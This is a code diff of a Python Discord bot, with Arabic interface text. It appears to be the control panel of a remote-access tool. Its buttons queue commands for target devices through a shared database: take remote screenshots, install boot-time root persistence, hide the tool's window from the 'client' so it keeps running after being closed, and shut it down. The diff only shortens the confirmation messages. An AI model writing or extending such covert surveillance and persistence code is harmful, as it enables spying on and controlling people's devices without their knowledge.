@@ -418,7 +418,7 @@ class DeviceActionsView(discord.ui.View):
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_screenshots", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"SS {self.code}Manager"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"SS {self.code}"): await interaction.followup.send("📸 تم طلب لقطة الشاشة!", ephemeral=True)
 
     @discord.ui.button(label="🌱 تثبيت جذور الإقلاع", style=discord.ButtonStyle.success, custom_id=lambda s=code: f"root_inst_{s}", row=2)
     async def root_install_action(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -444,8 +444,7 @@ class DeviceActionsView(discord.ui.View):
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_lock_states", {})[self.code] = {"locked": True, "id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Lock {self.code}"): 
-                await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة للعميل، وستستمر الأداة بالعمل في الخلفية حتى عند إغلاق الواجهة بـ (X)!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Lock {self.code}"): await interaction.followup.send("🛡️ تم تفعيل الثبات الجذري وإخفاء النافذة!", ephemeral=True)
 
     @discord.ui.button(label="🔓 إلغاء الثبات (إظهار)", style=discord.ButtonStyle.secondary, custom_id="dev_act_unlock_app", row=3)
     async def unlock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -454,8 +453,7 @@ class DeviceActionsView(discord.ui.View):
         if db:
             if "remote_lock_states" in db and self.code in db["remote_lock_states"]:
                 del db["remote_lock_states"][self.code]
-            if save_db(db, sha, url, headers, f"Unlock {self.code}"): 
-                await interaction.followup.send("🔓 تم إلغاء الثبات وإعادة النافذة للوضع الطبيعي وإظهارها!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Unlock {self.code}"): await interaction.followup.send("🔓 تم إلغاء الثبات وإظهار النافذة!", ephemeral=True)
 
     @discord.ui.button(label="🛑 إطفاء الأداة", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_persistent", row=4)
     async def kill_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
